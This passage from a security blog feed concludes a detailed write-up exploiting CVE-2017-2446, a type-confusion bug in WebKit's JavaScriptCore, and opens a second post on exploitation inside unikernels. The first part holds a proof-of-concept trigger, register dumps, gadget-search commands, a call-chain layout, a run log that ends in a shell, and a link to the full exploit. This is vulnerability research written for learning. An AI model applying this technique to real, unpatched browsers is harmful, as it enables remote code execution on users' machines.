&lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;call&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0x41414141&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Results in:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Thread 1 &amp;quot;jsc&amp;quot; received signal SIGSEGV, Segmentation fault.
...
$rdi   : 0x0000000000000008
 ...
 → 0x7ffff77a4833 &amp;lt;JSC::IntlDateTimeFormat::initializeDateTimeFormat(JSC::ExecState&amp;amp;,+0&amp;gt; mov    eax, DWORD PTR [rdi]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hmm.. this also doesn’t look immediately useful. As a last ditch attempt, reading the docs we notice there is a both an &lt;code&gt;Intl.DateTimeFormat&lt;/code&gt; and an &lt;code&gt;Intl.NumberFormat&lt;/code&gt; with a similar &lt;code&gt;format&lt;/code&gt; call. Let’s try getting a reference to that function instead:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nx"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utils.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nx"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;int64.js&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Intl&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;NumberFormat&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
        &lt;span class="nx"&gt;q&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;caller&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;


&lt;span class="nx"&gt;i&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;format&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;valueOf&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;

&lt;span class="nx"&gt;q&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;call&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Int64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0x41414141&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)});&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Giving us:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Thread 1 &amp;quot;jsc&amp;quot; received signal SIGSEGV, Segmentation fault.
…
$rax   : 0x0000000041414141
…
 → 0x7ffff4b7c769 &amp;lt;unum_formatDouble_57+185&amp;gt; call   QWORD PTR [rax+0x48]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yeah, we can probably exploit this =p&lt;/p&gt;
&lt;p&gt;I’d like to say that finding this was due to a deep reading and understanding of WebKit’s internationalization code, but really I was just trying things at random until something crashed in a useful looking state. I’m sure I tried dozens of other things that didn’t end up working out along the way... From a pedagogical perspective, I’m aware that listing random things I tried is not exactly optimal, but that’s actually how I did it so :)&lt;/p&gt;
&lt;h3 id="exploit-planning"&gt;Exploit Planning&lt;/h3&gt;
&lt;p&gt;Let’s pause to take stock of where we’re at:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We have an arbitrary infoleak&lt;/li&gt;
&lt;li&gt;We have a relative write and no good way to expand it to an arbitrary write&lt;/li&gt;
&lt;li&gt;We have control over the program counter&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Using the infoleak we can find pretty much anything we want, thanks to linux loader behavior (&lt;code&gt;libc.so.6&lt;/code&gt; and thus &lt;code&gt;system()&lt;/code&gt; will always be at a fixed offset from &lt;code&gt;libJavaScriptCore.so&lt;/code&gt; which we already have the base address of leaked). A “proper” exploit would take a arbitrary shellcode and result in it’s execution, but we can settle with popping a shell.&lt;/p&gt;
&lt;p&gt;The ideal case here would be we have control over &lt;code&gt;rdi&lt;/code&gt; and can just point &lt;code&gt;rip&lt;/code&gt; at &lt;code&gt;system()&lt;/code&gt; and we’d be done. Let’s look at the register state where we hijack control flow, with pretty printing from &lt;a href="https://twitter.com/_hugsy"&gt;@_hugsy&lt;/a&gt;’s excellent &lt;a href="https://github.com/hugsy/gef"&gt;gef&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$rax   : 0x0000000041414141
$rbx   : 0x0000000000000000
$rcx   : 0x00007fffffffd644  →  0xb2de45e000000000
$rdx   : 0x00007fffffffd580  →  0x00007ffff4f14d78  →  0x00007ffff4b722d0  →  &amp;lt;icu_57::FieldPosition::~FieldPosition()+0&amp;gt; lea rax, [rip+0x3a2a91]        # 0x7ffff4f14d68 &amp;lt;_ZTVN6icu_5713FieldPositionE&amp;gt;
$rsp   : 0x00007fffffffd570  →  0x7ff8000000000000
$rbp   : 0x00007fffffffd5a0  →  0x00007ffff54dfc00  →  0x00007ffff51f30e0  →  &amp;lt;icu_57::UnicodeString::~UnicodeString()+0&amp;gt; lea rax, [rip+0x2ecb09]        # 0x7ffff54dfbf0 &amp;lt;_ZTVN6icu_5713UnicodeStringE&amp;gt;
$rsi   : 0x00007fffffffd5a0  →  0x00007ffff54dfc00  →  0x00007ffff51f30e0  →  &amp;lt;icu_57::UnicodeString::~UnicodeString()+0&amp;gt; lea rax, [rip+0x2ecb09]        # 0x7ffff54dfbf0 &amp;lt;_ZTVN6icu_5713UnicodeStringE&amp;gt;
$rdi   : 0x00007fffb2d5c120  →  0x0000000041414141 (&amp;quot;AAAA&amp;quot;?)
$rip   : 0x00007ffff4b7c769  →  &amp;lt;unum_formatDouble_57+185&amp;gt; call QWORD PTR [rax+0x48]
$r8    : 0x00007fffffffd644  →  0xb2de45e000000000
$r9    : 0x0000000000000000
$r10   : 0x00007ffff35dc218  →  0x0000000000000000
$r11   : 0x00007fffb30065f0  →  0x00007fffffffd720  →  0x00007fffffffd790  →  0x00007fffffffd800  →  0x00007fffffffd910  →  0x00007fffb3000000  →  0x0000000000000003
$r12   : 0x00007fffffffd644  →  0xb2de45e000000000
$r13   : 0x00007fffffffd660  →  0x0000000000000000
$r14   : 0x0000000000000020
$r15   : 0x00007fffb2d5c120  →  0x0000000041414141 (&amp;quot;AAAA&amp;quot;?)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So, &lt;code&gt;rax&lt;/code&gt; is fully controlled and &lt;code&gt;rdi&lt;/code&gt; and &lt;code&gt;r15&lt;/code&gt; are pointers to &lt;code&gt;rax&lt;/code&gt;. Nothing else seems particularly useful. The ideal case is probably out, barring some significant memory sprays to get memory addresses that double as useful strings. Let’s see if we can do it without &lt;code&gt;rdi&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id="one_gadget"&gt;one_gadget&lt;/h3&gt;
&lt;p&gt;On linux, there is a handy tool for this by &lt;a href="https://twitter.com/david942j"&gt;@david924j&lt;/a&gt; called &lt;a href="https://github.com/david942j/one_gadget"&gt;one_gadget&lt;/a&gt;. &lt;code&gt;one_gadget&lt;/code&gt; is pretty straightforward in its use: you give it a libc, it gives you the offsets and constraints for PC values that will get you a shell. In my case:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x41bce execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
constraints:
  rax == NULL

0x41c22 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe1b3e execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So, we have three constraints, and if we can satisfy any one of them, we’re done. Obviously the first is out -- we take control of PC with a &lt;code&gt;call [rax+0x48]&lt;/code&gt; so &lt;code&gt;rax&lt;/code&gt; cannot be &lt;code&gt;NULL&lt;/code&gt;. So, now we’re looking at stack contents. Because nothing is ever easy, neither of the stack based constraints are met either. Since the easy solutions are out, let’s look at what we have in a little more detail.&lt;/p&gt;
&lt;h3 id="memory-layout-and-rop"&gt;Memory layout and ROP&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;       +------------------+
rax -&amp;gt; |0xdeadbeefdeadbeef|
       +------------------+
       |        ...       |
       +------------------+
+0x48  |0x4141414141414141| &amp;lt;- new rip
       +------------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To usefully take control of execution, we will need to construct an array with our target PC value at offset &lt;code&gt;+0x48&lt;/code&gt;, then call our type confusion with that value. Because we can construct &lt;code&gt;ArrayWithDouble&lt;/code&gt;’s arbitrary, this isn’t really a problem: populate the array, use our infoleak to find the array base, use that as the type confusion value.&lt;/p&gt;
&lt;p&gt;A normal exploit path in this case will focus on getting a stack pivot and setting up a rop chain. In our case, if we wanted to try this the code we would need would be something like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;X&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c"&gt;; or r15&lt;/span&gt;
&lt;span class="no"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;Y&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;X&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;Y&lt;/span&gt;
&lt;span class="nf"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Where X and Y can be any register. While some code with these properties likely exists inside some of the mapped executable code in our address  space, searching for it would require some more complicated tooling than I was familiar with or felt like learning. So ROP is probably out for now.&lt;/p&gt;
&lt;h3 id="reverse-gadgets"&gt;Reverse gadgets&lt;/h3&gt;
&lt;p&gt;By this point we are very familiar with the fact that WebKit is C++, and C++ famously makes heavy use of function indirection much to the despair of reverse engineers and glee of exploit writers. Normally in a ROP chain we find snippets of code and chain them together, using &lt;code&gt;ret&lt;/code&gt; to transfer control flow between them but that won’t work in this case. However, what if we could leverage C++’s indirection to get us the ability to execute gadgets. In our specific current case, we’re taking control of PC on a &lt;code&gt;call [rax + 0x48]&lt;/code&gt;, with a fully controlled &lt;code&gt;rax&lt;/code&gt;. Instead of looking for gadgets that end in &lt;code&gt;ret&lt;/code&gt;, what if we look for gadgets that end in &lt;code&gt;call [rax + n]&lt;/code&gt; and stitch them together.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~$ objdump -M intel -d ~/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so \
    | grep &amp;#39;call   QWORD PTR \[rax&amp;#39; \
    | wc -l
7214
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;7214 gadgets is not a bad playground to choose from. Obviously &lt;code&gt;objdump&lt;/code&gt; is not the best disassembler for this as it won’t find all instances (e.g. overlapping/misaligned instructions), but it should be good enough for our purposes. Let’s combine this idea with &lt;code&gt;one_gadget&lt;/code&gt; constraints. We need a series of gadgets that:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Zero a register&lt;/li&gt;
&lt;li&gt;Write that register to &lt;code&gt;[rsp+0x28]&lt;/code&gt; or &lt;code&gt;[rsp+0x58]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;All of which end in a &lt;code&gt;call [rax+n]&lt;/code&gt;, with each &lt;code&gt;n&lt;/code&gt; being unique&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Why &lt;code&gt;+0x28&lt;/code&gt; or &lt;code&gt;+0x58&lt;/code&gt; instead of &lt;code&gt;+0x30&lt;/code&gt; or &lt;code&gt;+0x60&lt;/code&gt; like &lt;code&gt;one_gadget&lt;/code&gt;’s output? Because the the final call into &lt;code&gt;one_gadget&lt;/code&gt; will push the next PC onto the stack, offsetting it by 8. With a little bit of grepping, this was surprisingly easy to find. We’re going to search backwards, first, let’s go for the stack write.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~$ objdump -M intel -d ~/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so \
    | grep -B1 &amp;#39;call   QWORD PTR \[rax&amp;#39; \
    | grep -A1 &amp;#39;mov    QWORD PTR \[rsp+0x28\]&amp;#39;
...
  5f6705:       4c 89 44 24 28          mov    QWORD PTR [rsp+0x28],r8
  5f670a:       ff 50 60                call   QWORD PTR [rax+0x60]
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This find us four unique results, with the one we’ll use being the only one listed. Cool, now we just need to find a gadget to zero &lt;code&gt;r8&lt;/code&gt;...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~$ objdump -M intel -d ~/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so \
    | grep -B4 &amp;#39;call   QWORD PTR \[rax&amp;#39; \
    | grep -A4 &amp;#39;xor    r8&amp;#39;
…
  333503:       45 31 c0                xor    r8d,r8d
  333506:       4c 89 e2                mov    rdx,r12
  333509:       48 89 de                mov    rsi,rbx
  33350c:       ff 90 f8 00 00 00       call   QWORD PTR [rax+0xf8]
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For this one, we need to broaden our search a bit, but still find what we need without too much trouble (and have our choice of five results, again with the one we’ll use being the only one listed). Again, &lt;code&gt;objdump&lt;/code&gt; and &lt;code&gt;grep&lt;/code&gt; are not the best tool for this job, but if it’s stupid and it works…&lt;/p&gt;
&lt;p&gt;One takeaway from this section is that &lt;code&gt;libJavaScriptCore&lt;/code&gt; is over 12mb of executable code, and this means your bigger problem is figuring what to look for as opposed to finding it. With that much code, you have an embarrassment of useful gadgets. In general, it made me curious as to the practical utility of fancy gadget finders on larger binaries (at least in case where the payloads don’t need to be dynamically generated).&lt;/p&gt;
&lt;p&gt;In any case, we now have all the pieces we need to trigger and land our exploit.&lt;/p&gt;
&lt;h2 id="putting-it-all-together"&gt;Putting it all together&lt;/h2&gt;
&lt;p&gt;To finish this guy off, we need to construct our pseudo jump table. We know we enter into our chain with a &lt;code&gt;call [rax+0x48]&lt;/code&gt;, so that will be our first gadget, then we look at the offset of the call to determine the next one. This gives us a layout like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;       +------------------+
rax -&amp;gt; |0xdeadbeefdeadbeef|
       +------------------+
       |       ...        |
       +------------------+
+0x48  |     zero r8      | &amp;lt;- first call, ends in call [rax+0xf8]
       +------------------+
       |       ...        |
       +------------------+
+0x60  |    one gadget    | &amp;lt;- third call, gets us our shell
       +------------------+
       |       ...        |
       +------------------+
+0xf8  |    write stack   | &amp;lt;- second call, ends in call [rax+0x60]
       +------------------+
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We construct this array using normal JS, then just chase pointers from leaks we have until we find the array. In my implementation I just used a magic 8 byte constant which I searched for, effectively performing a big &lt;code&gt;memmem()&lt;/code&gt; on the heap. Once it’s all lined up, the dominoes fall and &lt;code&gt;one_gadget&lt;/code&gt; gives us our shell :)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~/babys-first-webkit$ ./jsc zildjian.js
setting up ghetto_memcpy()...
done:
function () {
    [native code]
}

setting up read primitives...
done.

leaking string addr...
string @ 0x00007feac5b96814

leaking jsc base...
reading @ 0x00007feac5b96060
libjsc .data leak: 0x00007feaca218f28
libjsc .text @ 0x00007feac95e8000
libc @ 0x00007feac6496000
one gadget @ 0x00007feac64d7c22

leaking butterfly arena...
reading @ 0x00007feac5b95be8
buttefly arena leak: 0x00007fea8539eaa0

searching for butterfly in butterfly arena...
butterfly search base: 0x00007fea853a8000
found butterfly @ 0x00007fea853a85f8

replacing array search tag with one shot gadget...
setting up take_rip...
done:
function format() {
    [native code]
}
setting up call target: 0x00007fea853a85b0
getting a shell... enjoy :)
$ id
uid=1000(x) gid=1000(x) groups=1000(x),27(sudo)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The exploit is here: &lt;a href="https://gist.github.com/yrp604/5ef4996357e78da237be3727808174a0"&gt;zildjian.js&lt;/a&gt;. Be warned that while it seems to be 100% deterministic, it is incredibly brittle and includes a bunch of offsets that are specific to my box. Instead of fixing the exploit to make it general purpose, I opted to provide all the info for you to do it yourself at home :)&lt;/p&gt;
&lt;p&gt;If you have any questions, or if you have suggestions for better ways to do anything, be it exploit specifics or general approaches please (really) drop me a line on Twitter or IRC. As the length of this article might suggest, I’m happy to discuss this to death, and one of my hopes in writing this all down is that someone will see me doing something stupid and correct me.&lt;/p&gt;
&lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;With the exploit working, let’s reflect on how this was different from common CTF problems. There are two difference which really stand out to me:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The bug is more subtle than a typical CTF problem. This makes sense, as CTF problems are often meant to be understood within a ~48 hour period, and when you can have bigger/more complex systems you have more opportunity for mistakes like these.&lt;/li&gt;
&lt;li&gt;CTF problems tend to scale up difficulty by giving worse exploit primitives, rather than harder bugs to find. We’ve all seen contrived problems where you get execution control in an address space with next to nothing in it, and need to MacGyver your way out. While this can be a fun and useful exercise, I do wish there were good ways to include the other side of the coin.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Some final thoughts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This was significantly harder than I expected. I went in figuring I would have some fairly localized code, find a heap smash, relative write, or UaF and be off to the races. While that may be true for some browser bugs, in this case I needed a deeper understanding of browser internals. My suspicion is that this was not the easiest bug to begin browser exploitation with, but on the upside it was very… educational.&lt;/li&gt;
&lt;li&gt;Most of the work here was done over a ~3 month period in my free time. The initial setup and research to get a working infoleak took just over a month, then I burned over a month trying to find a way to get an arbitrary write out of &lt;code&gt;fastMalloc&lt;/code&gt;. Once I switched to &lt;code&gt;Intl.NumberFormat&lt;/code&gt; I landed the exploit quickly.&lt;/li&gt;
&lt;li&gt;I was surprised by how important object layouts were for exploitation, and how relatively poor the tooling was for finding and visualizing objects that could be instantiated and manipulated from the runtime.&lt;/li&gt;
&lt;li&gt;With larger codebases such as this one, when dealing with an unknown component or function call I had the most consistent success balancing an approach of guessing what I viewed as likely behavior and reading and understanding the code in depth. I found it was very easy to get wrapped up in guessing how something worked because I was being lazy and didn’t want to read the code, or alternatively to end up reading and understanding huge amounts of code that ended up being irrelevant to my goals. &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most of these points boil down to “more code to understand makes it more work to exploit”. Like most problems, once you understand the components the solution is fairly simple. With a larger codebase the most time by far was spent reading and playing with the code to understand it better.&lt;/p&gt;
&lt;p&gt;I hope you’ve enjoyed this writeup, it would not have been possible without significant assistance from a bunch of people. Thanks to &lt;a href="https://twitter.com/natashenka"&gt;@natashenka&lt;/a&gt; for the bugs, &lt;a href="https://twitter.com/agustingianni"&gt;@agustingianni&lt;/a&gt; for answering over a million questions, &lt;a href="https://twitter.com/5aelo"&gt;@5elo&lt;/a&gt; and &lt;a href="https://twitter.com/_niklasb"&gt;@_niklasb&lt;/a&gt; for the Phrack article and entertaining my half-drunk questions during CanSec respectively, &lt;a href="https://twitter.com/0vercl0k"&gt;@0vercl0k&lt;/a&gt; who graciously listened to me rant about butterflies at least twenty times, &lt;a href="https://twitter.com/itszn13"&gt;@itszn13&lt;/a&gt; who is definitely the the best RPISEC alumnus of all time, and &lt;a href="https://twitter.com/mongobug"&gt;@mongobug&lt;/a&gt; who provided helpful ideas and shamed me into finishing exploit and writeup.&lt;/p&gt;</content><category term="JavascriptCore"></category><category term="jsc"></category><category term="cve-2017-2446"></category><category term="exploitation"></category></entry><entry><title>happy unikernels</title><link href="/blog/2016/12/21/happy-unikernels/" rel="alternate"></link><published>2016-12-21T18:59:00-08:00</published><updated>2016-12-21T18:59:00-08:00</updated><author><name>yrp</name></author><id>tag:None,2016-12-21:/blog/2016/12/21/happy-unikernels/</id><summary type="html">&lt;h1 id="intro"&gt;Intro&lt;/h1&gt;
&lt;p&gt;Below is a collection of notes regarding unikernels. I had originally prepared this stuff to submit to EkoParty’s CFP, but ended up not wanting to devote time to stabilizing PHP7’s heap structures and I lost interest in the rest of the project before it was complete. However, there are still some cool takeaways I figured I could write down. Maybe they’ll come in handy? If so, please let let me know.&lt;/p&gt;
&lt;p&gt;Unikernels are a continuation of turning everything into a container or VM. Basically, as many VMs currently just run one userland application, the idea is that we can simplify our entire software stack by removing the userland/kernelland barrier and essentially compiling our usermode process into the kernel. This is, in the implementation I looked at, done with a NetBSD kernel and a variety of either &lt;a href="https://github.com/rumpkernel/rumprun-packages"&gt;native or lightly-patched POSIX applications&lt;/a&gt;  (bonus: there is significant lag time between upstream fixes and rump package fixes, just like every other containerized solution).&lt;/p&gt;
&lt;p&gt;While I don’t necessarily think that conceptually unikernels are a good idea (attack surface reduction vs mitigation removal), I do think people will start more widely deploying them shortly and I was curious what memory corruption exploitation would look like inside of them, and more generally what your payload options are like.&lt;/p&gt;
&lt;p&gt;All of the following is based off of two unikernel programs, nginx and php5 and only makes use of public vulnerabilities. I am happy to provide all referenced code (in varying states of incompleteness), on request.&lt;/p&gt;
</summary><content type="html">&lt;h1 id="intro"&gt;Intro&lt;/h1&gt;
&lt;p&gt;Below is a collection of notes regarding unikernels. I had originally prepared this stuff to submit to EkoParty’s CFP, but ended up not wanting to devote time to stabilizing PHP7’s heap structures and I lost interest in the rest of the project before it was complete. However, there are still some cool takeaways I figured I could write down. Maybe they’ll come in handy? If so, please let let me know.&lt;/p&gt;
&lt;p&gt;Unikernels are a continuation of turning everything into a container or VM. Basically, as many VMs currently just run one userland application, the idea is that we can simplify our entire software stack by removing the userland/kernelland barrier and essentially compiling our usermode process into the kernel. This is, in the implementation I looked at, done with a NetBSD kernel and a variety of either &lt;a href="https://github.com/rumpkernel/rumprun-packages"&gt;native or lightly-patched POSIX applications&lt;/a&gt;  (bonus: there is significant lag time between upstream fixes and rump package fixes, just like every other containerized solution).&lt;/p&gt;
&lt;p&gt;While I don’t necessarily think that conceptually unikernels are a good idea (attack surface reduction vs mitigation removal), I do think people will start more widely deploying them shortly and I was curious what memory corruption exploitation would look like inside of them, and more generally what your payload options are like.&lt;/p&gt;
&lt;p&gt;All of the following is based off of two unikernel programs, nginx and php5 and only makes use of public vulnerabilities. I am happy to provide all referenced code (in varying states of incompleteness), on request.&lt;/p&gt;


&lt;div class="toc"&gt;&lt;span class="toctitle"&gt;Table of contents:&lt;/span&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#intro"&gt;Intro&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#basic-hello-world-example"&gt;Basic ‘Hello World’ Example&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#compiling-and-baking"&gt;Compiling and ‘Baking’&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#booting-and-debugging"&gt;Booting and Debugging&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#peekpoke-tool"&gt;Peek/Poke Tool&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#memory-protections"&gt;Memory Protections&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#nginx"&gt;nginx&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#reason-why-this-doesnt-work"&gt;Reason Why This Doesn’t Work&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#something-interesting"&gt;Something Interesting&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#aslr"&gt;ASLR&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#php"&gt;PHP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#persistence"&gt;Persistence&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#heap-notes"&gt;Heap Notes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#symbol-resolution"&gt;Symbol Resolution&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#hypervisor-fuzzing"&gt;Hypervisor fuzzing&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#final-suggestions"&gt;Final Suggestions&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="#thanks"&gt;Thanks&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h1 id="basic-hello-world-example"&gt;Basic ‘Hello World’ Example&lt;/h1&gt;
&lt;p&gt;To get a basic understanding of a unikernel, we’ll walk through a simple ‘Hello World’ example. First, you’ll need to clone and build (&lt;code&gt;./build-rr.sh&lt;/code&gt;) the &lt;a href="https://github.com/rumpkernel/rumprun"&gt;rumprun&lt;/a&gt; toolchain. This will set you up with the various utilities you'll need.&lt;/p&gt;
&lt;h2 id="compiling-and-baking"&gt;Compiling and ‘Baking’&lt;/h2&gt;
&lt;p&gt;In a rumpkernel application, we have a standard POSIX environment, minus anything involving multiple processes. Standard memory, file system, and networking calls all work as expected. The only differences lie in the multi-process related calls such as &lt;code&gt;fork()&lt;/code&gt;, &lt;code&gt;signal()&lt;/code&gt;, &lt;code&gt;pthread_create()&lt;/code&gt;, etc. The scope of these differences can be found in the &lt;a href="http://www.fixup.fi/misc/rumpkernel-book/rumpkernel-bookv2-20160802.pdf"&gt;The Design and Implementation of the Anykernel and Rump Kernels [pdf]&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;From a super basic, standard ‘hello world’ program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Hello&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


